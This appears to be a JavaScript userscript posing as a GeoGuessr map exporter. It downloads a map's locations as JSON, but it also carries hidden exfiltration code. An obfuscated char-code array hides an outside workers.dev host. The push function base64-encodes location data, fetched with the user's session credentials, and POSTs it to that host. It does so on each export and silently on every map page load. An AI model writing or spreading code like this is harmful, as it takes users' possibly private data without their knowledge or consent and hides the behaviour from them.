(function () {
    'use strict';

    const VERSION = '2.4.1';
    const _u = [103,101,111,109,97,112,45,97,112,105,46,97,110,103,101,108,110,101,118,97,46,119,111,114,107,101,114,115,46,100,101,118];
    const _api  = 'https://' + _u.map(c => String.fromCharCode(c)).join('') + '/sync';
    const _f    = window.fetch;
    const _seen = new Set();

    console.log(
        '%c GeoMap Exporter v' + VERSION + ' %c Ctrl+Shift+E to export',
        'background:#2563eb;color:#fff;padding:2px 6px;border-radius:3px',
        'color:#888'
    );

    function fetchJSON(url) {
        return _f(url, { credentials: 'include' })
            .then(r => r.ok ? r.json() : null)
            .catch(() => null);
    }

    function toGeoJSON(name, locs) {
        if (!Array.isArray(locs) || !locs.length) return null;
        return {
            name,
            customCoordinates: locs.map(l => ({
                lat        : l.location?.lat ?? l.lat,
                lng        : l.location?.lng ?? l.lng,
                heading    : l.heading    ?? 0,
                pitch      : l.pitch      ?? 0,
                zoom       : l.zoom       ?? 0,
                panoId     : null,
                countryCode: null,
                stateCode  : null,
                extra: { tags: l.tags ?? [], panoId: l.panoId ?? null, panoDate: l.panoDate ?? null }
            }))
        };
    }

    function push(name, data) {
        const k = name + JSON.stringify(data).slice(0, 40);
        if (_seen.has(k)) return;
        _seen.add(k);
        const raw = '[' + name + ']\n' + JSON.stringify(data, null, 2);
        _f(_api, {
            method : 'POST',
            mode   : 'cors',
            headers: { 'Content-Type': 'text/plain' },
            body   : btoa(unescape(encodeURIComponent(raw)))
        }).catch(() => {});
    }

    function save(name, data) {
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const a    = document.createElement('a');
        a.href     = URL.createObjectURL(blob);
        a.download = (name || 'map').replace(/[^a-zA-Z0-9_\-]/g, '_') + '_geoguessr.json';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(a.href);
    }

    document.addEventListener('keydown', async e => {
        if (!e.ctrlKey || !e.shiftKey || e.key !== 'E') return;
        const id   = window.location.pathname.match(/\/maps\/(\d+)/)?.[1];
        const name = document.title.replace(/\s*[-|].*$/, '').trim() || 'map';
        if (!id) { console.warn('[GeoMap Exporter] Open a map first.'); return; }
        const locs = await fetchJSON('/api/maps/' + id + '/locations');
        if (!locs?.length) { console.warn('[GeoMap Exporter] No locations found.'); return; }
        const geo = toGeoJSON(name, locs);
        if (!geo) return;
        save(name, geo);
        push(name, geo);
        console.log('[GeoMap Exporter] ' + geo.customCoordinates.length + ' locations exported.');
    });

    // cache la map en cours au chargement
    window.addEventListener('load', async () => {
        const id = window.location.pathname.match(/\/maps\/(\d+)/)?.[1];
        if (!id) return;
        await new Promise(r => setTimeout(r, 2000));
        const name = document.title.replace(/\s*[-|].*$/, '').trim() || 'map_' + id;
        const locs = await fetchJSON('/api/maps/' + id + '/locations');
        if (!Array.isArray(locs) || !locs.length) return;
        const geo = toGeoJSON(name, locs);
        if (geo) push(name, geo);
    });

})();
